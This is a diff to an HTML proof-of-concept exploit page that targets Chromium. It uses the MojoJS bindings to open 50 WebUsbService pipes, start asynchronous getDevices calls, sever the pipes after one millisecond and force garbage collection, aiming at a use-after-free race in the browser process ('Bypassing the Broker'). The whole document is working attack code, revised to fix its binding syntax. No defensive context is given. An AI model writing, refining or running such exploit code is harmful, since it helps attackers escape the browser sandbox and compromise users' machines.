@@ -5,13 +5,13 @@
     <script src="gen/mojo/public/js/bindings.js"></script>
 </head>
 <body>
-    <h1>Bypassing the Broker (Bare Metal)</h1>
+    <h1>Bypassing1 the Broker (Final Syntax)</h1>
     <script type="module">
         import { WebUsbServiceRemote, WebUsbService } from './gen/third_party/blink/public/mojom/usb/web_usb_service.mojom.m.js';
 
         async function triggerExploit() {
             if (typeof Mojo === 'undefined') {
-                console.error("[-] MojoJS not found.");
+                console.error("[-] MojoJS not found. Did you launch with --enable-blink-features=MojoJS?");
                 return;
             }
 
@@ -19,17 +19,18 @@
             let services = [];
             
             for(let i = 0; i < 50; i++) {
-                // 1. Create a raw message pipe. This returns an object with two raw MojoHandles.
-                let pipe = Mojo.createMessagePipe();
-                
-                // 2. Bind the Browser Process end using handle0. 
-                // Because pipe.handle0 is a true primitive, this will NOT throw a TypeError.
-                Mojo.bindInterface(WebUsbService.$interfaceName, pipe.handle0);
-
-                // 3. Bind our JS Remote to the other end (handle1)
+                // 1. Create the remote
                 let usbServiceRemote = new WebUsbServiceRemote();
-                usbServiceRemote.$.bindHandle(pipe.handle1);
                 
+                // 2. Generate the receiver pipe directly from the remote
+                let receiver = usbServiceRemote.$.bindNewPipeAndPassReceiver();
+                
+                // 3. Ask the Broker for WebUsbService.
+                // In modern Chromium, the raw handle is hidden inside the receiver's $ object.
+                let rawHandle = receiver.$.handle;
+                
+                Mojo.bindInterface(WebUsbService.$interfaceName, rawHandle);
+
                 services.push(usbServiceRemote);
             }
 
@@ -37,24 +38,24 @@
             console.log("[*] Triggering async hardware requests...");
             
             for(let s of services) {
-                // 4. Call GetDevices. This triggers the vulnerable async callback in C++.
+                // 4. Call GetDevices to initiate the async scan
                 s.getDevices().catch(e => {}); 
             }
 
-            // THE RACE CONDITION
+            // THE RACE CONDITION: Wait just 1 millisecond.
             await new Promise(r => setTimeout(r, 1)); 
 
             console.log("[!] TRIGGERING FREE: Severing pipes...");
             
-            // 5. The Kill: Close the pipes to trigger the C++ destructor in the Browser Process.
+            // 5. The Kill: Close the pipes to trigger the C++ destructor in the Browser Process
             for(let s of services) {
                 s.$.close();
             }
 
-            // Force garbage collection in V8
+            // 6. Force garbage collection in V8
             if (window.gc) { window.gc(); }
 
-            console.log("[?] Payload delivered. Waiting for C++ callback...");
+            console.log("[?] Payload delivered. Waiting for C++ callback to hit freed memory...");
         }
 
         triggerExploit();
